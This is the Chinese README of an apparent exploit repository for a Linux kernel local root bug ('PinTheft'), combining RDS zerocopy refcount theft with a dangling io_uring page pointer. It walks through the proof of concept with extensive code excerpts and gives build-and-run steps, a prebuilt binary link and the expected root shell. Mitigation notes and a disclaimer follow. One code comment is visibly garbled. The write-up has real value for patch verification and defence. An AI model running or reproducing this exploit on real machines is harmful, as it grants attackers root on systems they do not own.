# QVD-2026-27616 — PinTheft

> **Linux 内核本地提权 | RDS zcopy double-free | io_uring page cache overwrite | 官方 CVSS 暂未确认** | [复现方法](#复现步骤)
>
> 这条链子的狠点不在「写了哪里」，而在「谁还以为自己拥有那一页」。`io_uring` 先把用户页 pin 住，RDS zcopy 的错误路径再把这 1024 个 pin ref 偷干净。页面被释放、被 SUID 程序页缓存重占，但 `io_uring` 手里还握着旧的 `struct page *`。最后一次 `READ_FIXED`，shellcode 就写进了 `/usr/bin/su` 的 page cache。

---

## 演示视频

https://github.com/user-attachments/assets/971754d0-cf3b-41fc-8982-4d86e937b5be

---

## 漏洞速览

| 项目 | 内容 |
|------|------|
| **漏洞编号** | QVD-2026-27616 |
| **漏洞代号** | PinTheft |
| **漏洞类型** | Linux 内核本地权限提升 (LPE) |
| **核心缺陷** | RDS zerocopy 错误路径 double-free / 引用计数异常递减 |
| **利用原语** | `io_uring` dangling `struct page *` + page cache overwrite |
| **影响组件** | RDS (`CONFIG_RDS`, `CONFIG_RDS_TCP`) + io_uring (`CONFIG_IO_URING`) |
| **权限要求** | 本地非特权用户；PoC 注释标注无需 capabilities |
| **目标对象** | 可读的 SUID-root 二进制，例如 `/usr/bin/su`、`/usr/bin/passwd`、`/usr/bin/pkexec` |
| **PoC 架构** | x86_64 payload；利用思路本身不强依赖架构 |
| **CVSS / CWE** | 官方口径暂未确认 |
| **官方补丁 / 影响版本** | 暂未从本仓库确认 |

一句话概括：**PinTheft 不是直接越界写文件，而是先偷走页面引用计数，再让旧指针指向一页「已经换了身份」的物理页。**

---

## 受影响范围

当前仓库只提供了利用代码，没有附带官方 advisory、补丁 commit 或发行版矩阵。因此这里按 PoC 中可验证的前置条件描述，不编版本号。

### 内核配置要求

PoC 文件头明确写到：

```c
/*
 * Requires CONFIG_RDS, CONFIG_RDS_TCP (auto-loaded via SO_RDS_TRANSPORT=2
 * since the zcopy path checks t_type == RDS_TRANS_TCP), CONFIG_IO_URING
 * with io_uring_disabled=0, and a readable suid-root binary. No capabilities
 * needed. x86_64 payload, technique is arch-independent.
 */
```

也就是需要同时满足：

| 条件 | 说明 |
|------|------|
| `CONFIG_RDS` | 启用 RDS 协议族 |
| `CONFIG_RDS_TCP` | 启用 RDS over TCP；PoC 通过 `SO_RDS_TRANSPORT=2` 触发 |
| `CONFIG_IO_URING` | 启用 io_uring |
| `io_uring_disabled=0` | 系统未禁用 io_uring |
| 可读 SUID-root binary | 用作 page cache overwrite 的目标 |
| x86_64 用户态 | 当前内嵌 `SHELL_ELF` 是 x86_64 ELF |

### 快速自查

```bash
# 检查内核配置
zgrep -E "CONFIG_RDS|CONFIG_RDS_TCP|CONFIG_IO_URING" /proc/config.gz 2>/dev/null \
  || grep -E "CONFIG_RDS|CONFIG_RDS_TCP|CONFIG_IO_URING" /boot/config-$(uname -r)

# 检查 io_uring 是否被禁用
cat /proc/sys/kernel/io_uring_disabled 2>/dev/null

# 检查常见 SUID-root 目标
find /usr/bin /bin -maxdepth 1 -perm -4000 -type f -ls 2>/dev/null
```

> **注意**：上面的命令只能判断前置条件，不等于确认某个内核版本一定受影响。准确影响范围需要以官方安全公告、补丁回溯和发行版内核源码为准。

---

## 根因分析

这条链子看起来长，但核心矛盾很干净：**RDS 把页面引用计数多减了，io_uring 又相信自己保存的 `struct page *` 永远还活着。**

### 第一层：RDS zerocopy 的错误路径会多释放页面

漏洞点位于 RDS 的 zerocopy 处理路径：

```c
rds_message_zcopy_from_user()
```

PoC 注释把根因说得很直：

```c
/*
 * Bug: rds_message_zcopy_from_user() pins user pages via GUP (FOLL_GET) one
 * at a time. If a later page faults, the error path put_page()s the already
 * pinned pages, then rds_message_purge() __free_page()s them again because
 * op_mmp_znotifier was NULLed but op_nents/sg entries were left intact. When
 * the page still has other references, __free_page silently decrements the
 * refcount. Each failing sendmsg steals exactly one ref from the first page.
 */
```

拆开看就是：

1. `rds_message_zcopy_from_user()` 逐页 pin 用户页；
2. 如果后续页面 fault，错误路径先对已经 pin 的页面执行 `put_page()`；
3. 后续 `rds_message_purge()` 又根据残留的 `op_nents / sg entries` 再走一次 `__free_page()`；
4. 当页面还有其他引用时，`__free_page()` 不一定立刻炸，而是安静地把 refcount 再减一次；
5. 每次失败的 `sendmsg()`，都能从第一个页面上「偷走」一个引用。

PoC 里对应的函数是：

```c
static int steal_one_ref(void *page_addr, int port) {
    int fd = socket(AF_RDS, SOCK_SEQPACKET, 0);
    ...
    setsockopt(fd, SOL_SOCKET, SO_ZEROCOPY, &v, sizeof(v));
    ...
    v = 2;
    setsockopt(fd, SOL_RDS, SO_RDS_TRANSPORT, &v, sizeof(v));
    ...
    struct iovec iov = { page_addr, 2 * PAGE_SIZE };
    ...
    sendmsg(fd, &m, MSG_ZEROCOPY | MSG_DONTWAIT);
    close(fd);
    return 0;
}
```

关键点是 `iov_len = 2 * PAGE_SIZE`，但第二页被 PoC 设置成 `PROT_NONE` guard page。这样 RDS 会先处理第一页，再在后续页面上失败，稳定进入错误释放路径。

### 第二层：FOLL_PIN 的 1024 引用偏移

PoC 定义了这个常量：

```c
#define GUP_PIN_COUNTING_BIAS 1024
```

`io_uring REGISTER_BUFFERS` 会通过 `FOLL_PIN` 固定用户页。对普通页面来说，这不是简单 `+1`，而是通过 `GUP_PIN_COUNTING_BIAS` 把 refcount 加上 1024。

PoC 先注册一页匿名页：

```c
static int uring_register_buffers(struct uring *r, void *buf, size_t len) {
    struct iovec iov = { .iov_base = buf, .iov_len = len };
    int ret = syscall(__NR_io_uring_register, r->fd,
                      IORING_REGISTER_BUFFERS, &iov, 1);
    ...
}
```

此时页面大概是：

```text
PTE mapping:       +1
FOLL_PIN bias:  +1024
---------------------
refcount:       ~1025
```

然后 PoC 让 RDS 失败路径跑 1024 次：

```c
for (int i = 0; i < GUP_PIN_COUNTING_BIAS; i++) {
    int port = PORT_BASE + i * 2;
    int ret = steal_one_ref(buf, port);
    ...
}
```

跑完之后，`io_uring` 以为自己还 pin 着这页；但页面 refcount 上那 1024 个 pin ref 已经被 RDS 的错误路径偷完了。

### 第三层：`munmap()` 让页面干净释放

PoC 注释里特别提到 `CONFIG_INIT_ON_ALLOC_DEFAULT_ON`：

```c
/*
 * On kernels with CONFIG_INIT_ON_ALLOC_DEFAULT_ON (which enables the
 * check_pages static key), __free_pages_prepare will see nonzero memcg_data
 * on a charged page and call bad_page(). init_on_alloc also zeros every
 * newly allocated page, destroying any payload placed before allocation.
 *
 * We bypass both. Pin the target page via io_uring REGISTER_BUFFERS, which
 * adds GUP_PIN_COUNTING_BIAS (1024) to the refcount through FOLL_PIN. Steal
 * all 1024 pin refs with failing zcopy sends. The page refcount is now ~1
 * (just the PTE mapping). munmap takes the normal __folio_put path, which
 * calls mem_cgroup_uncharge (clearing memcg_data) before freeing. No
 * bad_page check fires. Page freed cleanly to PCP.
 */
```

这一步是整条链的细节分水岭。

如果粗暴把页面打到异常状态，内核可能在 `bad_page()` 或初始化清零阶段把链子断掉。PoC 的做法是让页面最后只剩 PTE mapping 那一个正常引用，再用：

```c
munmap(buf, PAGE_SIZE)
```

走正常释放路径。这样 memcg 信息被正常清理，页面干净进入 per-CPU page list，也就是 PCP。

### 第四层：io_uring 还握着旧 `struct page *`

真正把「引用计数 bug」变成「任意目标页写入」的，是 io_uring 的固定缓冲区机制。

PoC 注释：

```c
/*
 * io_uring keeps the raw struct page* in its bvec array with no liveness
 * checks. After the page is reclaimed as page cache for a suid binary,
 * READ_FIXED writes our payload into it through that dangling pointer.
 */
```

也就是说，页面已经释放了，甚至被重新分配给别的用途了，但 io_uring 的 bvec 数组里仍然保存着原来的 `struct page *`。

这个指针没有变。

变的是那一页的身份。

---

## 利用机制

### 攻击链路

PoC 文件头给出了完整链路：

```c
/*
 * Chain: register(+1024) -> clone(refs=2) -> daemon holds clone -> steal
 * 1024 refs -> evict target page cache -> drain PCP -> munmap(free) ->
 * pread target(reclaim) -> READ_FIXED(overwrite) -> verify -> exec -> root
 */
```

换成流程图就是：

```text
非特权用户
  │
  ├─ mmap 两页匿名内存，第二页设为 PROT_NONE guard
  │
  ├─ io_uring REGISTER_BUFFERS
  │    └─ FOLL_PIN 让第一页 refcount += 1024
  │
  ├─ IORING_REGISTER_CLONE_BUFFERS
  │    └─ ring2 + daemon 持有 clone，阻止 ring1 cleanup 正常 unpin
  │
  ├─ RDS MSG_ZEROCOPY sendmsg 失败 1024 次
  │    └─ 每次偷走 1 个 refcount
  │
  ├─ posix_fadvise(DONTNEED) 驱逐目标 SUID binary 的 page cache
  │
  ├─ drain PCP + munmap(buf)
  │    └─ 目标页释放到 PCP 顶部，但 io_uring bvec 仍指向它
  │
  ├─ pread(target)
  │    └─ SUID binary 的 page cache 重占同一物理页
  │
  ├─ IORING_OP_READ_FIXED
  │    └─ 通过 dangling struct page* 把 SHELL_ELF 写入 page cache
  │
  └─ execve(target)
       └─ 以内核页缓存中的 payload 运行，获得 root shell
```

### PoC 分析 (`exploit/exp.c`)

#### 步骤 1：寻找 SUID-root 目标

PoC 内置了一组常见目标：

```c
static const char *suid_candidates[] = {
    "/usr/bin/su",
    "/bin/su",
    "/usr/bin/mount",
    "/usr/bin/passwd",
    "/usr/bin/chsh",
    "/usr/bin/newgrp",
    "/usr/bin/umount",
    "/usr/bin/pkexec",
    "/mnt/suid_helper",
    NULL,
};
```

查找逻辑很简单，只要文件存在并带 SUID 位：

```c
static const char *find_suid_target(void) {
    for (int i = 0; suid_candidates[i]; i++) {
        struct stat st;
        if (stat(suid_candidates[i], &st) == 0 && (st.st_mode & S_ISUID)) {
            OK("found suid target: %s", suid_candidates[i]);
            return suid_candidates[i];
        }
    }
    return NULL;
}
```

#### 步骤 2：安全备份目标文件

虽然攻击实际改的是 page cache，不是磁盘文件，但 PoC 仍然会先备份目标 SUID 程序：

```c
static int backup_target(const char *path) {
    ...
    snprintf(backup, sizeof(backup), "/tmp/.backup_%s_%d", name, getpid());
    LOG("backing up %s → %s", path, backup);
    ...
}
```

执行前会打印恢复命令：

```c
fprintf(stderr,
        ANSI_YELLOW ANSI_BOLD
        "=== RESTORE: sudo cp /tmp/.backup_%s_%d %s && sudo chmod u+s %s ==="
        ANSI_RESET "\n",
        strrchr(target, '/') + 1, getpid(), target, target);
```

这一步很重要。页缓存污染理论上重启后消失，但测试环境里不要赌状态，尤其不要对真实业务机器运行。

#### 步骤 3：注册 io_uring fixed buffer

PoC 先建立 ring，再注册一页 buffer：

```c
if (uring_setup(&ring, 4) < 0) {
    munmap(buf, 2 * PAGE_SIZE);
    return -1;
}
if (uring_register_buffers(&ring, buf, PAGE_SIZE) < 0) {
    uring_destroy(&ring);
    munmap(buf, 2 * PAGE_SIZE);
    return -1;
}
```

这一步让 io_uring 的内部 bvec 保存了目标页的 `struct page *`，也让该页 refcount 增加约 1024。

PoC 自带的可视化输出把关系画成：

```text
io_uring bvec ──────────▶ struct page * ──────────▶ anon page / refcnt:1025 FOLL_PIN
```

#### 步骤 4：clone buffers，防止 cleanup 反杀

一个很容易踩坑的地方：如果后面直接关闭 ring1，io_uring 正常 cleanup 会尝试 unpin buffer。可这时候同一物理页可能已经变成 page cache 了，正常 unpin 反而会破坏新页面的 refcount。

PoC 用 `IORING_REGISTER_CLONE_BUFFERS` 绕开：

```c
static int uring_clone_buffers(struct uring *dst, struct uring *src) {
    struct io_uring_clone_buffers arg;
    memset(&arg, 0, sizeof(arg));
    arg.src_fd = src->fd;
    arg.flags = 0;
    arg.nr = 0; /* clone all */
    int ret = syscall(__NR_io_uring_register, dst->fd,
                      IORING_REGISTER_CLONE_BUFFERS, &arg, 1);
    ...
}
```

然后 fork 一个 daemon 子进程只负责持有 ring2 fd：

```c
static pid_t spawn_ring_holder(int ring2_fd) {
    pid_t pid = fork();
    if (pid != 0) return pid;
    fcntl(ring2_fd, F_SETFD, 0);
    for (int fd = 0; fd < 1024; fd++)
        if (fd != ring2_fd) close(fd);
    ...
    execl("/bin/sleep", "sleep", "99999", (char *)NULL);
    _exit(0);
}
```

PoC 注释说明了原因：

```c
/*
 * Closing ring1 would normally unpin the buffer (folio_put_refs with 1024),
 * corrupting whatever page now lives at that frame. We prevent this with
 * IORING_REGISTER_CLONE_BUFFERS: cloning to 1 秒之前 ring increments
 * imu->refs. io_buffer_unmap sees refs > 1 and returns without unpinning.
 * A forked daemon child holds the clone ring fd open indefinitely.
 */
```

#### 步骤 5：通过 RDS 失败 zcopy 偷走 1024 个 pin refs

PoC 循环 1024 次调用 `steal_one_ref()`：

```c
LOG("stealing %d refcounts...", GUP_PIN_COUNTING_BIAS);
int stolen = 0;
for (int i = 0; i < GUP_PIN_COUNTING_BIAS; i++) {
    int port = PORT_BASE + i * 2;
    int ret = steal_one_ref(buf, port);
    if (ret < 0) {
        /* port in use or RDS unavailable, skip */
        continue;
    }
    stolen++;
    if (stolen % 256 == 0)
        LOG("  stolen %d/%d refs", stolen, GUP_PIN_COUNTING_BIAS);
}
```

如果偷得太少，PoC 会放弃：

```c
if (stolen < GUP_PIN_COUNTING_BIAS - 10) {
    ERR("too few stolen refs, aborting");
    ...
    return -1;
}
```

这不是玄学喷射。它要偷的是 `FOLL_PIN` 那个固定的 1024 bias。

#### 步骤 6：控制页面回收和重占

PoC 利用 PCP 的 LIFO 特性：

```c
/*
 * PCP is LIFO, so we pin to one CPU and drain stale entries before freeing,
 * putting our page at the top when the page cache allocator grabs it.
 */
```

主函数开头先固定 CPU：

```c
int main(void) {
    pin_cpu(0);
    LOG("pinned to CPU 0");
    ...
}
```

释放前先驱逐目标 page cache：

```c
if (evict_page_cache(target) < 0) {
    ERR("failed to evict page cache");
    uring_destroy(&ring);
    return -1;
}
```

然后 drain PCP：

```c
void *drain_pages[256];
for (int i = 0; i < 256; i++) {
    drain_pages[i] = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
}
```

最后释放目标页：

```c
if (munmap(buf, PAGE_SIZE) < 0) {
    perror("munmap buf");
    uring_destroy(&ring);
    return -1;
}
```

此时：

```text
io_uring bvec  ─X────────▶  freed page on PCP top
```

指针还在，但页面已经自由了。

#### 步骤 7：让 SUID binary 的 page cache 重占同一页

PoC 立刻读取目标 SUID 文件：

```c
int tfd = open(target, O_RDONLY);
...
uint8_t verify_buf[PAGE_SIZE];
if (pread(tfd, verify_buf, PAGE_SIZE, 0) < 0) {
    perror("pread target");
    close(tfd);
    uring_destroy(&ring);
    return -1;
}
```

目标文件的第 0 页被读入 page cache。因为刚才释放的页在 PCP 顶部，page cache 分配有机会拿回同一物理页。

这时同一个 `struct page *` 指向的已经不是匿名用户页，而是：

```text
page cache of /usr/bin/su page 0
```

#### 步骤 8：`IORING_OP_READ_FIXED` 写入 payload

PoC 创建一个临时 payload 文件，内容是 4096 字节页面，开头放 `SHELL_ELF`：

```c
static int create_payload_file(void) {
    char path[] = "/tmp/.payload_XXXXXX";
    int fd = mkstemp(path);
    ...
    unlink(path);

    uint8_t page[PAGE_SIZE];
    memset(page, 0, sizeof(page));
    memcpy(page, SHELL_ELF, sizeof(SHELL_ELF));

    if (write(fd, page, PAGE_SIZE) != PAGE_SIZE) {
        ...
    }
    return fd;
}
```

`SHELL_ELF` 是 129 字节 x86_64 ELF：

```c
static const uint8_t SHELL_ELF[129] = {
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,
    ...
};
```

它的逻辑是：

```text
setuid(0) → execve("/bin/sh", NULL, NULL)
```

随后提交 `IORING_OP_READ_FIXED`：

```c
sqe->opcode = IORING_OP_READ_FIXED;
sqe->fd = file_fd;
sqe->off = 0;
sqe->addr = (uint64_t)(unsigned long)buf;
sqe->len = len;
sqe->buf_index = 0;
sqe->user_data = 0x1234;
```

表面上这是把 payload 文件读进 fixed buffer。

实际 fixed buffer 背后的 `struct page *` 已经成了目标 SUID 文件的 page cache。于是读操作落点变成：

```text
payload file → dangling bvec → /usr/bin/su page cache
```

#### 步骤 9：校验并执行目标

PoC 重新读取目标文件前 129 字节，确认 page cache 已经被污染：

```c
if (memcmp(check, SHELL_ELF, sizeof(SHELL_ELF)) != 0) {
    ERR("verification FAILED — first mismatch at byte %d", first_diff);
    ...
    return -1;
}
OK("verification PASSED — page cache overwritten with SHELL_ELF");
```

校验通过后执行目标：

```c
execl(target, target, (char *)NULL);
```

如果目标是 SUID-root，内核从被污染的 page cache 加载 ELF，payload 调用 `setuid(0)` 后拉起 `/bin/sh`。

---

## 为什么这条链可靠

| 设计点 | 作用 |
|--------|------|
| `FOLL_PIN` 1024 bias | 给攻击者一个明确的「要偷多少次」目标，不需要猜 refcount |
| `PROT_NONE` guard page | 稳定触发 RDS zcopy 的后续页面 fault |
| `IORING_REGISTER_CLONE_BUFFERS` | 阻止 ring cleanup 正常 unpin 破坏重用页面 |
| daemon 持有 ring2 fd | 让 clone buffer 的生命周期跨过主利用流程 |
| `sched_setaffinity(0)` | 固定 CPU，配合 PCP LIFO 提高同页重占概率 |
| PCP drain | 清理 per-CPU page list 里的旧页面，让目标页更容易被下一次分配拿到 |
| `posix_fadvise(..., DONTNEED)` | 先驱逐目标 SUID 的 page cache，给重占创造空间 |
| overwrite 后再验证 | 避免直接执行未成功污染的目标 |
| `MAX_RETRIES = 5` | 页面重占失败时自动重试 |

它不是传统 race，也不是靠爆破内核地址。真正的不确定性主要在页面回收与重占，所以 PoC 把 CPU、PCP、page cache 驱逐和重试都安排上了。

---

## 复现步骤

> **只在你拥有授权的隔离实验环境中复现。不要在生产机、共享服务器或第三方系统上运行。该 PoC 会尝试污染 SUID-root 程序的页缓存，并可能留下 daemon 子进程。**

### 环境要求

- Linux 测试机或虚拟机；
- 内核启用 `CONFIG_RDS`、`CONFIG_RDS_TCP`、`CONFIG_IO_URING`；
- `/proc/sys/kernel/io_uring_disabled` 为 `0`；
- 存在可读 SUID-root 目标；
- x86_64 用户态环境；
- GCC / Clang 编译器。

注：也就是条件基本限定在archlinux中，作者也声明在其他发行版中复现难度较大

### 编译 PoC

```bash
cd "QVD-2026-27616 PinTheft/exploit"

gcc -O2 -Wall -Wextra -o exp exp.c
```

- 如果系统缺少相关内核头文件，需要安装发行版对应的 kernel headers / linux headers。
- 鉴于archlinux学习难度较大，复现推荐使用本仓库内[已编译好的文件](build/exp)

### 运行 PoC

```bash
./exp
```

成功时，PoC 会输出类似阶段信息：

```text
[*] pinned to CPU 0
[+] found suid target: /usr/bin/su
[*] backing up /usr/bin/su → /tmp/.backup_su_<pid>
[*] stealing 1024 refcounts...
[+] page freed to top of PCP — io_uring retains dangling struct page*
[*] submitting IORING_OP_READ_FIXED to overwrite page cache...
[+] verification PASSED — page cache overwritten with SHELL_ELF
[+] executing /usr/bin/su (now contains setuid(0) + execve /bin/sh)...
```

进入 shell 后验证：

```bash
id
```

预期效果：

```text
uid=0(root) gid=... groups=...
```

### 清理与恢复

PoC 会打印恢复命令，格式类似：

```bash
sudo cp /tmp/.backup_su_<pid> /usr/bin/su && sudo chmod u+s /usr/bin/su
```

同时建议清理 daemon：

```bash
pkill -f "sleep 99999"
```

如果只是 page cache 被污染，重启通常会清空缓存状态；但实验环境里仍建议按 PoC 输出的备份路径恢复，并在恢复后重新检查目标文件权限。

---

## 修复方案

由于本仓库没有附带官方补丁信息，这里只给出按漏洞链条推导出的防护方向。最终修复仍以 Linux 内核上游和发行版公告为准。

### 方案一：升级到发行版修复内核

这是唯一稳妥方案。

需要关注的修复点大概率在 RDS zerocopy 错误路径：

- 确保 `rds_message_zcopy_from_user()` 失败时不会重复释放已经 pin 的页面；
- 保证 `op_mmp_znotifier`、`op_nents`、scatterlist 状态一致；
- 避免 purge 路径对错误路径已经释放的页面再次 `__free_page()`。

### 方案二：禁用或限制 RDS

如果业务不使用 RDS，可以考虑禁用相关模块或阻止非特权用户触达 RDS socket。

示例方向：

```bash
# 具体模块名和发行版策略可能不同，执行前请先确认业务影响
lsmod | grep rds
```

对于可模块化的环境，可以通过 modprobe blacklist / install override 做临时缓解。但如果 RDS 被编译进内核，单纯卸载模块无效。

### 方案三：限制 io_uring

如果业务不依赖 io_uring，可以评估：

```bash
cat /proc/sys/kernel/io_uring_disabled
```

部分发行版支持通过 sysctl 禁用或限制 io_uring。需要注意：禁用 io_uring 可能影响数据库、异步 I/O 框架和高性能网络程序。

### 方案四：容器 / 沙箱加固

对不可信 workload：

- 使用 seccomp 限制 `io_uring_setup`、`io_uring_register`、`io_uring_enter`；
- 限制 `socket(AF_RDS, SOCK_SEQPACKET, 0)`；
- 避免容器内存在不必要的 SUID-root binary；
- 对 SUID 文件做最小化裁剪；
- 将高风险内核接口从默认可用面中拿掉。

> **边界提醒**：seccomp / module blacklist 是缓解，不是修复。只要底层内核漏洞仍在，换一条触达路径或换一个 workload 边界，就可能重新暴露。

---

## 时间线

当前仓库未包含官方披露时间线。可确认的只有本地 PoC 结构和编号信息：

| 日期 | 事件 |
|------|------|
| 2026 | QVD-2026-27616 / PinTheft 编号出现在本仓库目录中 |
| 暂缺 | 漏洞发现日期暂未确认 |
| 暂缺 | 厂商报告日期暂未确认 |
| 暂缺 | 补丁合入日期暂未确认 |
| 暂缺 | 公开披露日期暂未确认 |
| 暂缺 | 发行版修复矩阵暂未确认 |

如果后续补充官方 advisory、补丁 commit 或发行版公告，可以在这里补全。

---

## 参考资料

| 来源 | 链接 / 文件 |
|------|-------------|
| 本仓库 PoC | [`exploit/exp.c`](exploit/exp.c) |
| Linux io_uring UAPI | `include/uapi/linux/io_uring.h` |
| Linux RDS UAPI | `include/uapi/linux/rds.h` |
| 官方公告 | 暂缺 |
| 补丁 commit | 暂缺 |
| 发行版公告 | 暂缺 |

---

## 免责声明

本项目内容仅用于安全研究、漏洞复现、补丁验证与防御建设。请只在你拥有授权的隔离环境中编译和运行 PoC。

不要在生产环境、第三方系统、共享服务器或任何未经授权的机器上执行该代码。由未授权使用造成的任何后果，由使用者自行承担。
